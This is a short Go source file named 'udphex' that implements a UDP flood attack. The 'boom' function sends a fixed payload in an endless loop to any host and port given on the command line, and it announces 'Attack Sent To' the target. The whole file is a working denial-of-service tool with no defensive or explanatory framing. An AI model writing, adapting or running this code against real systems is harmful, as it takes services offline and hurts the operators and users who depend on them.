package udphex

import (
	"fmt"
	"net"
	"os"
	"time"
)

func boom() {
	target := os.Args[1]
	port := os.Args[2]
	conn, err := net.Dial("udp", target+":"+port)
	if err != nil {
		print(err)
	} else {
		fmt.Println("Attack Sent To " + target + " Using Port " + port + " With udphex!")
		for {
			conn.Write([]byte("\x64\x72\x61\x63\x6f\x73\x75\x64\x70\x68\x65\x78"))
		}
	}
}
